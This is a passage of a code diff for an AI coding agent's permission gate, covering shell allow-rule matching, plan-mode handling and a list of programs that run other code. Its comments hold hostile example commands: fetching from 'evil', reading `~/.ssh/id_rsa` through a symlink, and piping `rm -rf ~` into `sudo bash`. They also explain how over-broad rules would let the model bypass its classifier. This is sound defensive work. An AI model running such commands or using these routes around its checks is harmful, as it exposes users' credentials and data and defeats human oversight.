@@ -14,11 +14,11 @@ import { statSync } from "node:fs";
 import { homedir } from "node:os";
 import { isAbsolute, relative, resolve } from "node:path";
 import { domainToASCII } from "node:url";
-import { analyzeShellCommand, INLINE_SCRIPT_SHELLS, isUnknownTilde, leadTokens, movesDirectory, parseCommand, resolvePayload, type ShellEvidence } from "../shell/shell-analysis.ts";
+import { analyzeShellCommand, gateKnowsCommand, INLINE_SCRIPT_SHELLS, isUnknownTilde, leadTokens, movesDirectory, namesWrite, parseCommand, programName, resolvePayload, type ShellEvidence } from "../shell/shell-analysis.ts";
 import { pathArgument, resolveForContainment, toAbsolute, toAbsoluteBash } from "../shell/paths.ts";
 import { isSensitivePath } from "../shell/sensitive.ts";
 import { isProtectedPath, isWritingTool } from "./protected-paths.ts";
-import { powershellTreeContainedEdits } from "../shell/powershell-tree.ts";
+import { powershellTreeContainedEdits, powershellTreeNamesWrite, powershellTreeUnlistedOnly } from "../shell/powershell-tree.ts";
 import type { PowerShellParse } from "../shell/powershell-parser.ts";
 import {
 	canonicalCommandName,
@@ -405,10 +405,23 @@ export function isShellTool(toolName: string): boolean {
  * by a rule, or, for the whole substitution at once, by `readOnly` (the
  * auto-mode pre-gate's proof that it reads only inside the working directory
  * and writes nothing). So `Bash(git commit:*)` covers `git commit -m "$(cat
- * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. The read-only shortcut
+ * <<'EOF' … EOF)"` but not `npm test $(curl evil)`. The proof clears a
+ * substitution only under the order described below for a top-level command,
+ * counted from the command around it (`ln -sf ~/.ssh/id_rsa k && git commit
+ * -m "$(cat k)"` needs a rule for `cat`). A top-level command
+ * the same check proves read-only by itself needs no rule either
+ * (`Bash(gh api *)` covers `gh api x --jq y | head`), provided a rule covers
+ * at least one other command and no command a rule covers reads its output
+ * later in the pipeline (`echo code | sqlite3 app.db` still needs a rule for
+ * `echo`). The proof sees the files as they are before the line runs, so
+ * such a command must also come before every ruled command not itself
+ * proved read-only, or be a later pipeline stage that reads no file, only
+ * the pipe (`readsNoFile`: `| head`, `| grep pat`); `ln -s ~/.ssh/id_rsa k &&
+ * cat k` needs a rule for `cat`. The read-only shortcut
  * is off when the line moves directory first (`cd /etc && git commit -m
  * "$(cat passwd)"`), since the check resolves paths from the working
- * directory. An unparseable line, or one with a construct the pre-gate does
+ * directory, and when it runs a command in the background (`cat k & ln -sf
+ * ~/.ssh/id_rsa k`), which runs alongside the commands after it. An unparseable line, or one with a construct the pre-gate does
  * not model, is not covered. The rule returned is the first one that covered
  * a subcommand (for the "allowed by rule …" note).
  */
@@ -416,7 +429,7 @@ export function findBashAllowRule(
 	rules: PermissionRule[],
 	command: string,
 	toolName = "bash",
-	opts: { readOnly?: (command: string) => boolean } = {},
+	opts: { readOnly?: (command: string) => boolean; readsNoFile?: (command: string) => boolean } = {},
 ): PermissionRule | undefined {
 	const cmd = command.trim();
 	if (!cmd) return undefined;
@@ -449,18 +462,96 @@ export function findBashAllowRule(
 	const ruleFor = (raw: string) => bashRules.find((r) => r.pattern !== undefined && matchesBashPattern(r.pattern, raw));
 	const topLevel = parsed.segments.filter((seg) => seg.substitution === undefined && seg.raw.length > 0);
 	if (topLevel.length === 0) return undefined;
-	let first: PermissionRule | undefined;
-	for (const seg of topLevel) {
-		const rule = ruleFor(seg.raw);
-		if (!rule) return undefined;
-		first ??= rule;
+	const segmentRules = topLevel.map((seg) => ruleFor(seg.raw));
+	// At least one command must be the rule's: a line of read-only commands
+	// alone is the read-only fast path's to judge, not a rule's. Checked before
+	// any read-only proof, which runs the whole pre-gate per command.
+	const first = segmentRules.find((rule) => rule !== undefined);
+	if (!first) return undefined;
+	// The read-only proof is off after a `cd` on the line, whose later relative
+	// paths it would resolve from the wrong directory, and on a line with a
+	// background command (`cat k & ln -sf ~/.ssh/id_rsa k`), which runs
+	// alongside the commands after it, so no order holds that the proof can lean on.
+	const proofOff = parsed.background || topLevel.some(movesDirectory);
+	// The pipeline members that run a rule's command, and, for each member,
+	// the members after it in its pipeline.
+	const ruled = new Set(topLevel.flatMap((seg, index) => (segmentRules[index] ? seg.scopes : [])));
+	const later = new Map(parsed.pipelines.flatMap((members) => members.map((scope, i) => [scope, members.slice(i + 1)] as const)));
+	const feedsRule = (seg: { scopes: number[] }) => seg.scopes.some((scope) => later.get(scope)?.some((reader) => ruled.has(reader)));
+	const laterStages = new Set(parsed.pipelines.flatMap((members) => members.slice(1)));
+	const proofs = new Map<number, boolean>();
+	const readOnlyAt = (index: number): boolean => {
+		const known = proofs.get(index);
+		if (known !== undefined) return known;
+		const proved = opts.readOnly?.(topLevel[index].raw) ?? false;
+		proofs.set(index, proved);
+		return proved;
+	};
+	for (const [index, seg] of topLevel.entries()) {
+		if (segmentRules[index]) continue;
+		// A command the pre-gate proves read-only by itself needs no rule of its
+		// own (`gh api … | head`), as Claude Code allows a read-only subcommand
+		// on its own. Never for a command whose output a rule's command reads
+		// later in the pipeline: that command may run it (`echo 'rm -rf ~' |
+		// sudo bash` under `Bash(sudo bash)`).
+		if (proofOff || feedsRule(seg) || !readOnlyAt(index)) return undefined;
+		// The proof judged the files as they are before the line runs, so it
+		// holds only while nothing before this command can have changed them:
+		// every ruled command before it is itself proved read-only (`cat a && gh
+		// pr view 1`), or it is a later pipeline stage that reads no file at all,
+		// only the pipe (`gh api … | head`). Not `ln -s ~/.ssh/id_rsa k && cat k`.
+		const afterUnproven = segmentRules.slice(0, index).some((rule, before) => rule !== undefined && !readOnlyAt(before));
+		if (afterUnproven && !(seg.scopes.some((scope) => laterStages.has(scope)) && opts.readsNoFile?.(seg.raw))) return undefined;
 	}
-	const topLevelMoves = topLevel.some(movesDirectory);
-	for (const [index, text] of parsed.substitutions.entries()) {
-		const inner = parsed.segments.filter((seg) => seg.substitution === index);
-		if (inner.every((seg) => ruleFor(seg.raw))) continue;
-		if (!topLevelMoves && opts.readOnly?.(text)) continue;
-		return undefined;
+	// Each outermost substitution, by the top-level command it computes a word
+	// of: the last one that starts before it (segments are in source order, and
+	// a command starts before its own substitutions). A later command than the
+	// true one only counts more commands as running first.
+	const containers = new Map<number, number>();
+	const containerOf = (index: number): number => {
+		const known = containers.get(index);
+		if (known !== undefined) return known;
+		const at = parsed.segments.findIndex((seg) => seg.substitution === index);
+		let container = topLevel.length;
+		for (const [position, seg] of parsed.segments.entries()) {
+			if (position >= at) break;
+			if (seg.substitution === undefined && seg.raw.length > 0) container = topLevel.indexOf(seg);
+		}
+		containers.set(index, container);
+		return container;
+	};
+	// Each substitution's proof, run once: it runs the whole pre-gate.
+	const substitutionProofs = new Map<number, boolean>();
+	const substitutionReadOnly = (index: number): boolean => {
+		const known = substitutionProofs.get(index);
+		if (known !== undefined) return known;
+		const proved = opts.readOnly?.(parsed.substitutions[index]) ?? false;
+		substitutionProofs.set(index, proved);
+		return proved;
+	};
+	// The top-level commands that run alongside the one at `index`: the other
+	// members of its pipelines.
+	const alongside = (index: number): number[] => {
+		const members = new Set(parsed.pipelines.filter((pipeline) => pipeline.some((scope) => topLevel[index]?.scopes.includes(scope))).flat());
+		return topLevel.flatMap((seg, other) => (other > index && seg.scopes.some((scope) => members.has(scope)) ? [other] : []));
+	};
+	const innerOf = parsed.substitutions.map((_, index) => parsed.segments.filter((seg) => seg.substitution === index));
+	const byRule = innerOf.map((inner) => inner.every((seg) => ruleFor(seg.raw)));
+	for (const index of parsed.substitutions.keys()) {
+		if (byRule[index]) continue;
+		// The proof clears a substitution only under the same order as a
+		// top-level command: no ruled command the proof could not clear runs
+		// before the command around it, or alongside it in its pipeline (`ln -sf
+		// ~/.ssh/id_rsa k && git commit -m "$(cat k)"` is not covered), nor does
+		// a substitution a rule cleared in that same command (`git commit -m
+		// "$(ln -sf …)" -F "$(cat k)"`).
+		if (proofOff || !substitutionReadOnly(index)) return undefined;
+		const container = containerOf(index);
+		const unproven = (other: number) => segmentRules[other] !== undefined && !readOnlyAt(other);
+		if ([...segmentRules.keys()].slice(0, container).some(unproven) || alongside(container).some(unproven)) return undefined;
+		for (const other of parsed.substitutions.keys()) {
+			if (other !== index && byRule[other] && containerOf(other) === container && !substitutionReadOnly(other)) return undefined;
+		}
 	}
 	return first;
 }
@@ -935,6 +1026,13 @@ export interface Decision {
 		| "plan-mode"
 		| "plan-file"
 		| "plan-readonly"
+		/**
+		 * Plan mode: a shell line the pre-gate could not prove read-only and that
+		 * names no write, put to the user (an ask rule may have matched, `rule`).
+		 * Never handed to the classifier; with no user to answer, refused with the
+		 * plan-mode text.
+		 */
+		| "plan-unproven"
 		| "memory-dir"
 		| "scratchpad-dir"
 		| "mode"
@@ -994,22 +1092,94 @@ const DELEGATION_TOOLS = new Set(["Agent", "workflow", "SendMessage"]);
 const CLASSIFY_IN_AUTO_TOOLS = new Set(["cron_create", "schedule_wakeup"]);
 
 /**
- * Interpreters and runners whose arguments are code, so a wildcarded rule over
- * them (`Bash(python*)`, `Bash(npm run *)`) grants arbitrary execution just as
- * surely as `Bash(*)` does.
+ * How a program runs other code, which decides what an allow rule for it
+ * grants. The one list behind both auto mode's broad-rule filter
+ * (`isBroadExecutionRule`) and plan mode's runner check (`runsOtherCode`), so
+ * the two cannot drift:
+ *
+ * - `shell`, `interpreter`: its arguments, script files or stdin are code. Any
+ *   wildcarded rule for one is broad, and so is an exact rule that gives it no
+ *   operand to run (`Bash(sh)`, `Bash(bash -s)`), since piped input is code.
+ * - `wrapper`: runs another command it is handed (privilege changers, exec
+ *   and environment wrappers, remote and sandbox runners). Any wildcarded rule
+ *   for one is broad.
+ * - `toolchain`: a package manager or build tool whose own escape hatch runs
+ *   code (`npm run *`, `npx *`, `make *`). Broad only for those shapes, so
+ *   `Bash(npm test:*)` still skips the classifier in auto mode.
+ * - `plan`: runs code another way (a test or task runner, an editor or pager
+ *   with a shell escape, a database client, a scheduler, a builtin that
+ *   changes what a later word runs). Plan mode only: in auto mode a rule for
+ *   one keeps skipping the classifier, as it did before this list existed.
+ *
+ * Names are basenames, lowercased; `runnerKind` also tries the name without a
+ * trailing version (`python3.12`, `perl5.34`, `zsh-5.9`) and the part before
+ * its first `-` (`docker-compose`, `ssh-agent`). Missing a name here lets a
+ * user's rule for that program skip the check, so the list errs wide.
  */
-const INTERPRETERS_AND_RUNNERS =
-	/^(python[0-9.]*|python3|node|deno|bun|ruby|perl|php|osascript|bash|sh|zsh|fish|pwsh|powershell|cmd|wsl|eval|exec|env|xargs|nohup|setsid|timeout|make|npx|pnpx|yarn|npm|pnpm|bunx|uv|uvx|pip[0-9]*|poetry|cargo|go|dotnet|java|mvn|gradle|docker|kubectl|ssh|invoke-expression|invoke-command|start-process|start-job)\b/;
+type RunnerKind = "shell" | "interpreter" | "wrapper" | "toolchain" | "plan";
+const RUNNER_GROUPS: Record<RunnerKind, readonly string[]> = {
+	shell: ["bash", "sh", "zsh", "fish", "dash", "ksh", "mksh", "tcsh", "csh", "ash", "pwsh", "powershell", "cmd", "wsl"],
+	interpreter: [
+		"python", "pypy", "node", "nodejs", "deno", "tsx", "ts-node", "ruby", "irb", "perl", "php", "lua", "luajit", "osascript", "tclsh",
+		"wish", "expect", "r", "rscript", "julia", "swift", "groovy", "scala", "kotlin", "elixir", "erl", "escript", "ghci", "runghc",
+		"jshell", "jjs", "awk", "gawk", "mawk", "nawk", "dc", "bc", "m", "gnuplot", "octave", "source", ".", "eval",
+	],
+	wrapper: [
+		"exec", "env", "xargs", "nohup", "setsid", "timeout", "time", "nice", "ionice", "stdbuf", "flock", "script", "command", "builtin",
+		"sudo", "doas", "su", "runuser", "pkexec", "chroot", "nsenter", "unshare", "fakeroot", "firejail", "sandbox-exec", "watch",
+		"busybox", "parallel", "caffeinate", "taskset", "unbuffer", "chronic", "dbus-run-session", "xvfb-run", "arch", "xcrun", "ssh",
+		"strace", "ltrace", "valgrind", "gdb", "lldb", "hyperfine", "direnv", "mise", "asdf", "nix-shell", "nix", "entr",
+		"invoke-expression", "invoke-command", "start-process", "start-job",
+	],
+	toolchain: [
+		"npm", "npx", "pnpm", "pnpx", "yarn", "bun", "bunx", "uv", "uvx", "pip", "poetry", "cargo", "go", "dotnet", "java", "mvn", "gradle",
+		"make", "docker", "kubectl",
+	],
+	plan: [
+		"sed", "vim", "vi", "nvim", "view", "ex", "emacs", "ed", "nano", "less", "more", "most", "man", "rake", "just", "ninja", "cmake",
+		"bazel", "ant", "sbt", "lein", "mix", "composer", "bundle", "gem", "pipx", "conda", "mamba", "rustup", "podman", "nerdctl",
+		"vagrant", "terraform", "ansible", "ansible-playbook", "tmux", "screen", "at", "batch", "crontab", "systemd-run", "launchctl",
+		"open", "xdg-open", "nodemon", "swiftc", "sqlite", "psql", "mysql", "pdflatex", "latex", "xelatex", "lualatex", "luatex", "tex",
+		"pandoc", "fzf", "brew", "pytest", "tox", "pre-commit", "turbo", "nx", "ssh-agent", "hash", "alias", "unalias", "enable", "set",
+		"shopt", "trap", "export", "declare", "typeset", "readonly", "local",
+	],
+};
+const RUNNERS = new Map<string, RunnerKind>(
+	(Object.entries(RUNNER_GROUPS) as [RunnerKind, readonly string[]][]).flatMap(([kind, names]) => names.map((name) => [name, kind] as const)),
+);
+
+/** How the program `name` (a basename, lowercased) runs other code, if it does. */
+function runnerKind(name: string): RunnerKind | undefined {
+	const unversioned = name.replace(/-?[0-9][0-9.]*$/, "");
+	for (const candidate of [name, unversioned, name.split("-")[0], unversioned.split("-")[0]]) {
+		const kind = candidate ? RUNNERS.get(candidate) : undefined;
+		if (kind) return kind;
+	}
+	return undefined;
+}
+
+/** Whether the program `name` (a basename, lowercased) runs other programs or code it is given: plan mode's check. */
+function runsOtherCode(name: string): boolean {
+	return runnerKind(name) !== undefined;
+}
 
 /**
  * An allow rule broad enough to grant arbitrary code execution. Auto mode
- * suspends these — a blanket `Bash` or a wildcarded interpreter would otherwise
- * hand the model a standing way past the classifier, which is the one thing auto
- * mode exists to prevent. Narrow rules (`Bash(npm test:*)`) still resolve before
- * the classifier unless `classifyAllShell` is set.
+ * suspends these (the rule is ignored and the call takes the fast paths, then
+ * the classifier) — a blanket `Bash` or a wildcarded interpreter would
+ * otherwise hand the model a standing way past the classifier, which is the
+ * one thing auto mode exists to prevent; plan mode ignores them too. Narrow
+ * rules (`Bash(npm test:*)`) still resolve before the classifier unless
+ * `classifyAllShell` is set.
  *
- * Matches Claude Code's list: blanket `Bash(*)`/`PowerShell(*)`, wildcarded
- * interpreters, package-manager run commands, and `Agent`/`Task` rules.
+ * Broad: a blanket `Bash(*)`/`PowerShell(*)`, a pattern that starts with a
+ * wildcard (`Bash(* *)`, `Bash(*-*)`), any wildcarded rule whose command is a
+ * shell, an interpreter or a wrapper (`RUNNER_GROUPS`; spelled as a path or
+ * with a version too), an exact rule that hands a shell or interpreter no
+ * operand (`Bash(sh)`, `Bash(bash -s)`: piped input is code), a toolchain's
+ * code escape (`npm run *`, `npx *`, `make *`), and `Agent`/`Task` rules.
+ * Claude Code's own list (`DANGEROUS_BASH_PATTERNS`) is a subset in shapes and
+ * names.
  */
 export function isBroadExecutionRule(rule: PermissionRule): boolean {
 	// Delegation rules are dropped outright: a subagent is a fresh agent loop, so
@@ -1019,29 +1189,32 @@ export function isBroadExecutionRule(rule: PermissionRule): boolean {
 
 	if (!rule.pattern) return true;
 	const pattern = rule.pattern.trim().toLowerCase();
-	// Without a wildcard the rule matches one exact command, which is narrow by
-	// construction however powerful that command is — `Bash(python)` only ever
-	// starts a bare REPL.
-	if (!hasUnescapedWildcard(pattern)) return false;
-	if (/^(\*|:\*|\*\*)$/.test(pattern)) return true;
+	const wildcard = hasUnescapedWildcard(pattern);
+	// A leading wildcard matches any command word: `*`, `:*`, `* *`, `*-*`.
+	if (wildcard && /^(\*|:\*)/.test(pattern)) return true;
 
 	const rawHead = pattern.split(/[\s*]/)[0] ?? "";
 	// A PowerShell alias is as broad as its cmdlet: `PowerShell(iex *)` is
 	// `Invoke-Expression *`, `PowerShell(saps *)` is `Start-Process *`.
-	const head = rule.tool === "powershell" ? canonicalCommandName(rawHead).toLowerCase() : rawHead;
-	if (!INTERPRETERS_AND_RUNNERS.test(head)) return false;
+	const bareHead = rawHead.replace(/:$/, "");
+	const head = rule.tool === "powershell" ? canonicalCommandName(bareHead).toLowerCase() : bareHead;
+	const kind = runnerKind(programName(head));
+	if (!wildcard) {
+		// An exact rule matches one command, which is narrow however powerful
+		// that command is, unless it is a shell or interpreter given no operand
+		// to run: then it runs whatever is piped into it.
+		return (kind === "shell" || kind === "interpreter") && pattern.split(/\s+/).slice(1).every((word) => word.startsWith("-"));
+	}
+	if (kind === "shell" || kind === "interpreter" || kind === "wrapper") return true;
+	if (kind !== "toolchain") return false;
 
 	const rest = pattern.slice(rawHead.length).trim();
-	// Nothing constrains the arguments: `python*`, `node *`, `npm *`.
+	// Nothing constrains the arguments: `npm *`, `make:*`.
 	if (/^[:\s]*\*+$/.test(rest)) return true;
 	// The runner's own escape hatch takes arbitrary code: `npm run *`, `npx *`.
 	if (/^(run|exec|x)[:\s]*\*+$/.test(rest)) return true;
-	// Interpreter inline-code flags take arbitrary code: `python -c *`, `node -e *`,
-	// `sh -c *`, `bash -c *`, `ruby -e *`. Quote-wrapped spellings count too —
-	// `python3 -c '*` / `-c ' *` (as real settings write them) hand over exactly
-	// the same arbitrary code slot. Without this, such a rule granted a standing
-	// bypass of the classifier (over-flagging a runner's `-c` here only costs a
-	// classifier call, which is the safe direction).
+	// An inline-code flag takes arbitrary code: `java -e *`-style, quote-wrapped
+	// spellings included (over-flagging only costs a classifier call).
 	if (/^-(c|e)[\s:='"]*\*+['"]*$/.test(rest)) return true;
 	// `npm test:*` names the script, so it stays narrow.
 	return false;
@@ -1066,6 +1239,11 @@ export function decide(params: DecideInput): Decision {
 	const isReadOnly = (evidence: ShellEvidence): boolean => evidence.verdict === "safe" && evidence.writes.length === 0;
 	/** The pre-gate's proof that a command only reads inside the project, for a substitution in an allowed command. */
 	const readOnlyShell = (command: string): boolean => isReadOnly(shellEvidence(command));
+	/** The pre-gate's proof that a read-only command reads no file, only its stdin (`ShellEvidence.readsNoFile`). */
+	const readsNoFileShell = (command: string): boolean => {
+		const evidence = shellEvidence(command);
+		return isReadOnly(evidence) && evidence.readsNoFile;
+	};
 
 	// In dontAsk mode anything that would prompt is denied instead — including
 	// explicit ask rules: there is no user to put the question to.
@@ -1103,45 +1281,6 @@ export function decide(params: DecideInput): Decision {
 
 	if (mode === "bypassPermissions") return { decision: "allow", cause: "mode" };
 
-	const tier = toolTier(toolName);
-	if (mode === "plan" && tier !== "safe" && !AUTO_ALLOWED_TOOLS.has(tool)) {
-		// Plan mode's one writable file (~/.onecode/plans/<slug>.md, which
-		// protected-paths already excepts as working space).
-		const planFile = params.planFilePath;
-		if (planFile && isWritingTool(normalizeToolName(toolName)) && subject) {
-			const planTarget =
-				isPlanFilePath(subject, planFile, cwd) ||
-				(params.resolvedSubject ? isPlanFilePath(params.resolvedSubject, planFile, cwd) : false);
-			if (planTarget) return { decision: "allow", cause: "plan-file" };
-		}
-		// Read-only bash stays usable while planning (Claude Code permits it). The
-		// auto-mode shell pre-gate's "safe" verdict means "every command is on the
-		// read-only allowlist, nothing leaves the project" — plus in-project
-		// redirect writes, which it records; a safe verdict with no writes is
-		// exactly read-only. Anything it cannot vouch for is denied as before.
-		// Without this the frontier tier (no grep/find/ls) was left with `read` alone.
-		// The harness's readable session dirs, as the auto-mode pre-gate sees them
-		// (safety/permissions/index.ts `readableRoots`): a plan-mode read of this project's
-		// transcripts is a read like any other.
-		const readableRoots = sessionReadableRoots();
-		if (tool === "bash" && subject) {
-			const evidence = shellEvidence(subject);
-			if (isReadOnly(evidence)) return { decision: "allow", cause: "plan-readonly" };
-			// Read-only, but of a path outside the working directory: still a read,
-			// so it is put to the user rather than refused as a plan-mode mutation
-			// (the read tools ask for the same path below).
-			if (evidence.readOnlyOutside && evidence.writes.length === 0) return { decision: "ask", cause: "working-dir" };
-		}
-		// The PowerShell counterpart: read-only cmdlets on in-project paths,
-		// judged from PowerShell's own parse (powershell-tree.ts).
-		if (tool === "powershell" && subject && powershellReadOnly({ parse: params.powershellParse, cwd, home: homedir(), readableRoots }).readOnly) return { decision: "allow", cause: "plan-readonly" };
-		if (isPlanReadOnlyTool(toolName, tool)) {
-			const askRule = ask.find((r) => ruleMatches(r, toolName, subject, cwd));
-			return askRule ? askOrDeny(askRule) : { decision: "allow", cause: "plan-readonly" };
-		}
-		return { decision: "deny", cause: "plan-mode" };
-	}
-
 	/**
 	 * Whether an absolute path is a credential: the basename denylist, or at or
 	 * under one of the harness's own secret stores (`secretPaths`).
@@ -1165,6 +1304,156 @@ export function decide(params: DecideInput): Decision {
 		if (workspace && !sensitive && (params.workspaceDirs ?? []).some((dir) => isAtOrInsideDir(target, dir, cwd))) return true;
 		return params.planFilePath ? isPlanFilePath(target, params.planFilePath, cwd) : false;
 	};
+	/** Whether a path is protected: the static list or a runtime-protected directory. */
+	const isProtected = (...candidates: (string | undefined)[]) =>
+		candidates.some(
+			(candidate) =>
+				candidate &&
+				(isProtectedPath(candidate, cwd) || (params.protectedDirs ?? []).some((dir) => isAtOrInsideDir(candidate, dir, cwd))),
+		);
+	/**
+	 * Whether a redirect on the line reads or writes outside the working space,
+	 * onto a protected path, or somewhere only known at runtime (an expansion,
+	 * a glob, `~user`, or a relative target after a `cd`).
+	 */
+	const redirectEscapes = (command: string): boolean => {
+		const { segments, parseFailed } = parseCommand(command.trim());
+		// A line that did not parse may hide a redirect the segments dropped.
+		if (parseFailed) return /[<>]/.test(command);
+		const home = homedir();
+		// Only a `cd` before a redirect moves where its relative target lands.
+		let moved = false;
+		for (const segment of segments) {
+			if (movesDirectory(segment)) moved = true;
+			const targets = [...segment.redirects.map((value) => ({ value, write: true })), ...segment.inputs.map((token) => ({ value: token.value, write: false }))];
+			if (targets.length > 0 && segment.unknownTarget) return true;
+			for (const { value: target, write } of targets) {
+				if (DEVICE_TARGETS.has(target) || target.startsWith("/dev/fd/")) continue;
+				if (isUnknownTilde(target) || /[*?[]/.test(target)) return true;
+				if (moved && !isAbsolute(target) && !target.startsWith("~")) return true;
+				const absolute = toAbsoluteBash(cwd, target, home);
+				const resolved = resolveForContainment(absolute) ?? absolute;
+				// Auto mode's unclassified writes stay in the working directory, a
+				// workspace directory's included (decisions/modes.md).
+				if (!workingSpaceHolds(target, resolved, !(write && mode === "auto"), !write)) return true;
+				if (isProtected(absolute, resolved)) return true;
+			}
+		}
+		return false;
+	};
+
+	/**
+	 * Whether a stage after the first of a pipeline on the line is not provably
+	 * read-only by itself. A program reading a pipe may run what it reads (a
+	 * shell, `perl5.34`, `dc`, `sqlite3 db`), and no list of such programs is
+	 * complete, so in plan mode an allow rule covers only a line whose later
+	 * stages the pre-gate clears on their own (`gh pr view 1 | head`).
+	 */
+	const pipesIntoUnproven = (command: string): boolean => {
+		const { segments, pipelines, parseFailed } = parseCommand(command.trim());
+		if (parseFailed) return true;
+		const fed = new Set(pipelines.flatMap((members) => members.slice(1)));
+		return segments.some((segment) => segment.scopes.some((scope) => fed.has(scope)) && !readOnlyShell(segment.raw));
+	};
+
+	/**
+	 * Plan mode's answer for a shell line (bash, PowerShell), in this order:
+	 *
+	 * 1. A write the line names is refused: never asked about, never allowed
+	 *    by a rule.
+	 * 2. An ask rule asks, before the read-only allowance, as in the other modes.
+	 * 3. A provably read-only line runs (`plan-readonly`); a read-only line that
+	 *    reads outside the working directory is put to the user as a read.
+	 * 4. An allow rule allows, matched as the other modes match it (every
+	 *    subcommand in its literal spelling, never a redirect outside the
+	 *    working space), but only for a line whose one objection is a program
+	 *    the pre-gate knows nothing about (`ruleMayCover`: `gh`, not `sed -i`,
+	 *    `git push` or `cat ~/.ssh/id_rsa`) and that runs no program which runs
+	 *    other code (`runsOtherCode`), and never by a rule broad enough to run
+	 *    anything (`isBroadExecutionRule`). A rule names a command, not what
+	 *    its options do, so a known command that failed its table, or a runner
+	 *    whose arguments are code, would let a rule approve a write the gate
+	 *    cannot see.
+	 * 5. Anything else is put to the user.
+	 *
+	 * An unproven line's ask carries `plan-unproven`: it goes to the user,
+	 * never to auto mode's classifier (the mode is plan, so nothing below the
+	 * plan branch runs), and with no user to answer it the caller refuses it
+	 * with the plan-mode text. `ruleMayCover` is a thunk: it parses the line
+	 * again, so it runs only when step 4 is reached.
+	 */
+	const planShellLine = (line: { writes: boolean; readOnly: boolean; readOnlyOutside: boolean; ruleMayCover: () => boolean }): Decision => {
+		if (line.writes) return { decision: "deny", cause: "plan-mode" };
+		const askRule = ask.find((r) => ruleMatches(r, toolName, subject, cwd));
+		if (askRule) return line.readOnly || line.readOnlyOutside ? askOrDeny(askRule) : { decision: "ask", rule: askRule, cause: "plan-unproven" };
+		if (line.readOnly) return { decision: "allow", cause: "plan-readonly" };
+		if (line.readOnlyOutside) return { decision: "ask", cause: "working-dir" };
+		if (line.ruleMayCover() && !(tool === "bash" && redirectEscapes(subject))) {
+			const allowRule = findBashAllowRule(
+				allow.filter((rule) => !isBroadExecutionRule(rule)),
+				subject,
+				tool,
+				{ readOnly: readOnlyShell, readsNoFile: readsNoFileShell },
+			);
+			if (allowRule) return { decision: "allow", rule: allowRule, cause: "rule" };
+		}
+		return { decision: "ask", cause: "plan-unproven" };
+	};
+
+	const tier = toolTier(toolName);
+	if (mode === "plan" && tier !== "safe" && !AUTO_ALLOWED_TOOLS.has(tool)) {
+		// Plan mode's one writable file (~/.onecode/plans/<slug>.md, which
+		// protected-paths already excepts as working space).
+		const planFile = params.planFilePath;
+		if (planFile && isWritingTool(normalizeToolName(toolName)) && subject) {
+			const planTarget =
+				isPlanFilePath(subject, planFile, cwd) ||
+				(params.resolvedSubject ? isPlanFilePath(params.resolvedSubject, planFile, cwd) : false);
+			if (planTarget) return { decision: "allow", cause: "plan-file" };
+		}
+		// Read-only bash stays usable while planning (Claude Code permits it). The
+		// auto-mode shell pre-gate's "safe" verdict means "every command is on the
+		// read-only allowlist, nothing leaves the project" — plus in-project
+		// redirect writes, which it records; a safe verdict with no writes is
+		// exactly read-only. A line it cannot vouch for takes `planShellLine`:
+		// refused when it names a write, otherwise a rule or the user decides.
+		// Without this the frontier tier (no grep/find/ls) was left with `read` alone.
+		// The harness's readable session dirs, as the auto-mode pre-gate sees them
+		// (safety/permissions/index.ts `readableRoots`): a plan-mode read of this project's
+		// transcripts is a read like any other.
+		const readableRoots = sessionReadableRoots();
+		if (tool === "bash" && subject) {
+			const evidence = shellEvidence(subject);
+			return planShellLine({
+				writes: namesWrite(evidence),
+				readOnly: isReadOnly(evidence),
+				// Read-only, but of a path outside the working directory: still a
+				// read, put to the user as the read tools' outside read is.
+				readOnlyOutside: evidence.readOnlyOutside && evidence.writes.length === 0,
+				ruleMayCover: () => evidence.unlistedOnly && evidence.commands.every((name) => !runsOtherCode(programName(name))) && !pipesIntoUnproven(subject),
+			});
+		}
+		// The PowerShell counterpart, judged from PowerShell's own parse
+		// (powershell-tree.ts). A line PowerShell has not parsed is refused:
+		// without the parse no write in it can be seen, and the gate clears
+		// nothing it has not parsed.
+		if (tool === "powershell" && subject) {
+			const parse = params.powershellParse;
+			if (!parse) return { decision: "deny", cause: "plan-mode" };
+			return planShellLine({
+				writes: powershellTreeNamesWrite(parse),
+				readOnly: powershellReadOnly({ parse, cwd, home: homedir(), readableRoots }).readOnly,
+				readOnlyOutside: false,
+				ruleMayCover: () => powershellTreeUnlistedOnly(parse, { cwd, home: homedir() }, (name) => !gateKnowsCommand(name) && !runsOtherCode(name)),
+			});
+		}
+		if (isPlanReadOnlyTool(toolName, tool)) {
+			const askRule = ask.find((r) => ruleMatches(r, toolName, subject, cwd));
+			return askRule ? askOrDeny(askRule) : { decision: "allow", cause: "plan-readonly" };
+		}
+		return { decision: "deny", cause: "plan-mode" };
+	}
+
 	// Claude Code's blockReadsOutsideWorkingDirectories refuses a read tool's
 	// outside path before any ask or allow rule can prompt for it or allow it
 	// (bypass mode returned above).
@@ -1208,12 +1497,6 @@ export function decide(params: DecideInput): Decision {
 	// Protected-path writes are checked *before* allow rules, so an
 	// `Edit(.claude/**)` entry cannot pre-approve reconfiguring the agent's own
 	// permissions or planting a git hook. In auto mode they go to the classifier.
-	const isProtected = (...candidates: (string | undefined)[]) =>
-		candidates.some(
-			(candidate) =>
-				candidate &&
-				(isProtectedPath(candidate, cwd) || (params.protectedDirs ?? []).some((dir) => isAtOrInsideDir(candidate, dir, cwd))),
-		);
 	if (isWritingTool(tool) && subject && isProtected(subject, params.resolvedSubject)) {
 		if (mode === "dontAsk") return { decision: "deny", cause: "protected-path" };
 		if (mode === "auto") return { decision: "classify", cause: "protected-path" };
@@ -1224,37 +1507,6 @@ export function decide(params: DecideInput): Decision {
 		if (mode === "auto") return { decision: "classify", cause: "working-dir" };
 		if (mode === "dontAsk") return { decision: "deny", cause: "working-dir" };
 		return { decision: "ask", cause: "working-dir" };
-	};
-
-	/**
-	 * Whether a redirect on the line reads or writes outside the working space,
-	 * onto a protected path, or somewhere only known at runtime (an expansion,
-	 * a glob, `~user`, or a relative target after a `cd`).
-	 */
-	const redirectEscapes = (command: string): boolean => {
-		const { segments, parseFailed } = parseCommand(command.trim());
-		// A line that did not parse may hide a redirect the segments dropped.
-		if (parseFailed) return /[<>]/.test(command);
-		const home = homedir();
-		// Only a `cd` before a redirect moves where its relative target lands.
-		let moved = false;
-		for (const segment of segments) {
-			if (movesDirectory(segment)) moved = true;
-			const targets = [...segment.redirects.map((value) => ({ value, write: true })), ...segment.inputs.map((token) => ({ value: token.value, write: false }))];
-			if (targets.length > 0 && segment.unknownTarget) return true;
-			for (const { value: target, write } of targets) {
-				if (DEVICE_TARGETS.has(target) || target.startsWith("/dev/fd/")) continue;
